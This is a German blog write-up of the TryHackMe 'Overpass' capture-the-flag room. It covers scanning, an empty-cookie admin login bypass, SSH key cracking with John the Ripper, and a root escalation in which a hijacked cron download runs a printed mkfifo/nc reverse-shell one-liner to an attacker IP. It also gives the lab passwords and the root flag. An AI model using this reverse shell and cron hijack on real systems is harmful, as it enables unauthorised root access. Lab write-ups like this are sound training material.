---
layout: post
title:  "THM: Overpass"
date:   2023-09-19 07:37:00 +0200
categories: ctf writeup
author: d33pjs
---

Das zweite CTF welches ich auf TryHackMe getestet habe, war "Overpass". Irgendwas mit Studenten und einem Passwortmanager der alles in Rot47 verschlüsselt. War eigentlich ganz nice...

Trotzdem hier das WriteUp.

[https://tryhackme.com/room/overpass](https://tryhackme.com/room/overpass)

![beginning](/assets/overpass/overpass.png)

# Step 1: nmap

`nmap -A <ip>`

Immer zu erst nmap... raus gekommen ist: Standard 80/tcp + 22/tcp offen - sonst nix

# Step 2: dirb

`dirb http://<ip>`

Angrifffläche ist hier wohl der Webserver. Also dirb mit default Wordlist. Auffällig war eigentlich nur das Verzeichnis `admin`, der Rest (`downloads`, `\` etc..) gehörte zum Webauftritt für den Overpass Passwortmanager. Sourcecode sowie diverse Builds konnte man im Downloadbereich finden.

Erst dachte ich auch, es hätte viel mehr mit dem Passwortmanager zu tun (irgendwelche Verbindungen per SSH/API... oder hardcoded credentials). 

# Step 3: admin

Beim Adminlogin hatte ich erst angefangen mit ZAP und dem Fuzzer einen Wordlistangriff zu starten (aber natürlich ist mir Java abgeraucht... und eigentlich ist das an der Stelle irgendwie cheaten, find ich). 

Ehrlicherweise habe ich dann erst durch einen WriteUp einen guten Tipp bekommen. Nämlich einen leeren `SessionToken` Cookie setzen. Ganz einfach über die Browserkonsole (Webdev Tools).

![cookiesset](/assets/overpass/overpass_login_admin.png)

Danach werden wir mit einem privaten SSH Key belohnt. Weil James immer sein Passwort vergisst. Man, James...

![cookiesset](/assets/overpass/overpass_afterlogin.png)

... allerdings, war er "Encrypted" (also 'n Passwort drauf, das ich nicht kenne...)

Aber warum gibt man James ein Passwort für seinen SSH Key, obwohl er immer wieder Passwörter vergisst? Und er die sogar lieber mit einem PostIt an den Monitor hängen möchte?
![butwhy](/assets/overpass/why-huh.gif)

# Step 5: John Wick?

... nein, John... The Ripper.

Der hilft mir (hoffentlich) das Passwort für den SSH Key raus zu bekommen. Erst muss der Key aber ins richtige John-Format :-). Dabei hilft `ssh2john` (n Pythonscript das unter Kali eigentlich vorhanden sein sollte).

- `ssh2john overpass_ssh_user_key_james.priv > overpass_ssh_user_key_james.john` dann...
- `john --wordlist=/usr/share/wordlists/rockyou.txt overpass_ssh_user_key_james.john`

Und wenn er dann sein Bleistifftding durchgezogen hat, fällt das Passwort `james13` raus. Man, James...

![johnssh](/assets/overpass/overpass_john_ssh.png)

# Step 6: First Flag

Nach dem Login (`ssh james@10.10.134.214 -i overpass_ssh_user_key_james.priv`) dann die first flag: `user.txt`

![sshsuccessfull](/assets/overpass/overpass_ssh_successfull.png)

![firstflag](/assets/overpass/overpass_firstflag.png)

# Step 7: How to (not) get root

Wie komme ich jetzt an die root flag?

### Setuid?

![setuid](/assets/overpass/overpass_suid.png)

Nope...

### Passwortmanager?

Hat der User vielleicht seinen eigenen Passwortmanager, Overpass, im Einsatz?

Jaaaa.... but:

![jamespw](/assets/overpass/overpass_system_pw_mgmt.png)

... jetzt hab ich zwar das Passwort des Users James `saydrawnlyingpicture`, aber das hilft mir leider nicht weiter.

![susudofailed](/assets/overpass/overpass_su_sudo_failed.png)

(Ich würd James auch keine Root Rechte geben, wenn der ständig sein Passwort vergisst)

# Step 8: How to GET root

### Crontab

Zufällig hab ich in die Crontab geschaut (war zumindest in dem Moment nicht mein "best gues")... und siehe da? Komische Dinge:

![crontab](/assets/overpass/overpass_crontab.png)

Curl lädt irgendwo ein Shell Script herunter? Und führt das auch noch direkt aus? ALS ROOT?? Wow... Hat bestimmt James eingerichtet.

### Hosts

Kinder, deswegen muss man jede noch so kleine Datei auf einem Linux ansehen, denn, wieder nur durch ein WriteUp, wurde ich auf die `/etc/hosts` hingewiesen. Und da fällt es einem dann wie Schuppen von den Augen:

![hosts](/assets/overpass/overpass_hosts.png)

Zur Erklärung, in dem Screenshot ist schon die Hosts Datei editiert. Der Host stand eigentlich auf 127.0.0.1

Wir könnten die Hosts ändern und die URL aus der Crontab (`overpass.thm/downloads/src/buildscript.sh`) auf einen, durch uns kontrollierten Webserver, schicken.

### build buildscript

Nach einigen Fehlversuchen, weil irgendeine Schrottversion auf dem System liegt, bin ich mit folgender Idee zum Ziel gekommen (steht sogar so in der Manpage von `nc`):

`echo 'rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1 |nc 10.9.113.208 4242 >/tmp/f'`

![building_buildscript](/assets/overpass/overpass_build_buildscript_listening.png)

Ab damit in ein `buildscript.sh`, dann mit python noch einen schnellen HTTP Server starten: `sudo python3 -m http.server 80`. Da `nc` eine Verbindung zur 10.9.113.208 aufbauen möchte, müssen wir dort (da läuft auch der python http.server) noch ein `nc -lnvp 4242` starten. Dann ist erst Mal warten angesagt. 

![webserver](/assets/overpass/overpass_serving_http_buildscript.png)

In dem Screenshot sind jetzt schon ein paar Versuche drin. Der Cronjob wird nämlich, wie man oben erkennen kann, jede Minute ausgeführt.

Nach dem der Connect auf unseren Angreifer-nc ausgeführt wurde, haben wir eine Shell. Da der Cronjob von root ausgeführt wurde, sogar eine Root Shell. Also kommen wir dort an die letzte Flag.

# Step 9: root flag

Siehe Screenshot... `thm{7f336f8c359dbac18d54fdd64ea753bb}` it is...


